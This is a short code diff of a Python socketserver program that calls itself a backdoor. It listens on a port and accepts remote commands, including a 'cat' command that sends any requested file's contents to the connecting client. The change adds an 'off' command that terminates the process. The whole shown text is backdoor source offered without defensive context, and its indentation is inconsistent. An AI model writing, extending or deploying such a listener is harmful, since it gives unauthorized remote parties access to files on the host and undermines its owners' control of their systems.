@@ -77,7 +77,7 @@ class MyTCPHandler(socketserver.BaseRequestHandler):
                     self.request.sendall(bytearray(cmd + "\n", "utf-8"))
                   continue
 
-        
+
 
                 # cat <file>
                if data.split(None, 1)[0] == "cat":
@@ -87,7 +87,12 @@ class MyTCPHandler(socketserver.BaseRequestHandler):
                   self.request.sendall(bytearray(contents, "utf-8"))
                   continue
 
-
+                # off
+               if data.split(None, 1)[0] == "off":
+                  print("Terminating myself...")
+                  self.request.sendall(bytearray("Terminating myself...So long\n", "utf-8"))
+                  os._exit(1)                                                       #exit without ptinting traceback
+                
                 
 
                   
@@ -110,3 +115,5 @@ if __name__ == "__main__":
    server = socketserver.TCPServer((HOST, PORT), MyTCPHandler)
    print("backdoor listening on port ", PORT)
    server.serve_forever()
+  
+   
